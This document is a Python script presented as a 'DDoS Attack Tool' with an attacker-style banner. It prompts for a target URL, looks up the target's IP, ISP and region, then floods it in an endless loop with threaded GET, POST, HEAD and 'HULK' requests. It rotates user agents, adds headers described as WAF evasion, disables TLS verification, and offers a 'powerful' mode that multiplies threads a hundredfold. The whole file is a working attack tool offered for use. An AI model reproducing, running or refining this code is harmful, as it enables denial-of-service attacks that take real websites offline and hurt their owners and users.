import requests
import threading
import time
import random
import string
import socket
import urllib3
from termcolor import colored

# Suppress only the single InsecureRequestWarning from urllib3 needed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Banner Display with color and fixed formatting
def memekv1():
    print(colored("""
    [#] Attack By : @DatxzzNetworkZ [#]
 __ _  __ __    _  _     __ ________    __
|_ |_)|_ |_    |_)|_||  |_ (_  |  | |\||_ 
|  | \|__|__   |  | ||__|____) | _|_| ||__
              Free Palestine
       """, 'red'))
    print("--------------------------------------------------")
    print(" - DDoS Attack Tool - ")
    print("--------------------------------------------------")
    print("Version: 1.1")
    print("Author: DatxzzXploit")
    print("--------------------------------------------------")
    print("Disclaimer: The official script I created is DatxzzXploit. Use this script wisely..")
    print("--------------------------------------------------")

# Function to get website info (ISP, Region, IP)
def website_info(url):
    try:
        # Get IP address
        ip_address = socket.gethostbyname(url.replace("http://", "").replace("https://", ""))
        print(f"IP Address: {ip_address}")
        
        # Get ISP and Region info
        response = requests.get(f"http://ipinfo.io/{ip_address}/json")
        info = response.json()
        print(f"ISP: {info.get('org', 'N/A')}")
        print(f"Region: {info.get('region', 'N/A')}")
        print(f"URL: {url}")
    except Exception as e:
        print(f"Error retrieving website info: {e}")

# Function to load user-agents from ua.txt
def load_user_agents():
    try:
        with open("ua.txt", "r") as file:
            user_agents = [line.strip() for line in file.readlines()]
        return user_agents
    except Exception as e:
        print(f"Error loading user agents: {e}")
        return []

# Function to generate a random user agent from the loaded list
def random_user_agent(user_agents):
    return random.choice(user_agents) if user_agents else "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"

# Function to generate random data for POST request
def random_data():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))  # random data for POST

# Function to simulate request with GET/POST methods, including WAF evasion headers, TLS bypass
def send_request(url, method="GET", user_agents=None):
    headers = {
        "User-Agent": random_user_agent(user_agents),
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": url,
        "Referer": url,
        "Dnt": "1",
        "TE": "Trailers"
    }

    try:
        # Send GET request (TLS Bypass)
        if method == "GET":
            requests.get(url, headers=headers, timeout=5, verify=False)  
        # Send POST request (TLS Bypass)
        elif method == "POST":
            data = random_data()
            requests.post(url, headers=headers, data=data, timeout=5, verify=False)  
        # Send HEAD request (TLS Bypass)
        elif method == "HEAD":
            requests.head(url, headers=headers, timeout=5, verify=False)  
        # Simulating HULK-like traffic (TLS Bypass)
        elif method == "HULK":
            headers["User-Agent"] = random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36"
            ])  
            requests.get(url, headers=headers, timeout=5, verify=False)  
        elif method == "RAPID":
            # Randomly choose a method for rapid attack
            rapid_method = random.choice(["GET", "POST", "HEAD", "HULK"])
            send_request(url, rapid_method, user_agents)  # Call recursively for rapid method
        elif method == "MIX":
            # Mixing methods for attack variety
            mixed_method = random.choice(["GET", "POST", "HEAD", "HULK"])
            send_request(url, mixed_method, user_agents)  # Recursively use the mixed method
    except requests.exceptions.RequestException as e:
        print(f"Request error: {e}")

# Function to handle thread RPS (requests per second) over a specified time
def thread_rps(url, threads, method="GET", user_agents=None):
    for i in range(threads):
        t = threading.Thread(target=send_request, args=(url, method, user_agents))
        t.start()
        time.sleep(0.1)  # Delay to avoid overloading the server too quickly

# Function for powerful attack (100x power increase)
def powerful_attack(url, threads, method="GET", user_agents=None):
    print("Starting powerful attack (100x power)...")
    new_threads = threads * 100  # Increase threads by 100 times
    thread_rps(url, new_threads, method, user_agents)

# Function to simulate starting idle time (attacker waits for a while)
def start_idle():
    print("Starting idle mode... Waiting before attacking.")
    time.sleep(5)  # Controlled wait time before attack
    print("Idle time finished. Starting attack...")

# Main function to control the flow
def start_attack(url, threads, attack_type, user_agents):
    start_idle()  # Idle mode
    while True:  # Infinite loop until interrupted
        if attack_type == "n" or attack_type == "y":
            for _ in range(threads):
                # Randomly choose the attack method (GET, POST, HEAD, HULK, RAPID, or MIX)
                method = random.choice(["GET", "POST", "HEAD", "HULK", "RAPID", "MIX"])  
                print(f"Using method: {method}")
                if attack_type == "n":
                    print("Starting normal attack...")
                    thread_rps(url, threads, method, user_agents)
                elif attack_type == "y":
                    powerful_attack(url, threads, method, user_agents)
        else:
            print("Invalid attack type. Exiting.")
            break
        time.sleep(0.1) # Adding slight delay between attack iterations to avoid overwhelming the CPU

def main():
    memekv1()

    url = input("Enter target URL : ")
    threads = int(input("Enter number of threads (e.g., 10): "))
    attack_type = input("Choose attack type (n for normal / y for powerful): ")

    website_info(url)

    user_agents = load_user_agents()

    if attack_type == "n" or attack_type == "y":
        start_attack(url, threads, attack_type, user_agents)
    else:
        print("Invalid attack type. Exiting.")

if __name__ == "__main__":
    main()
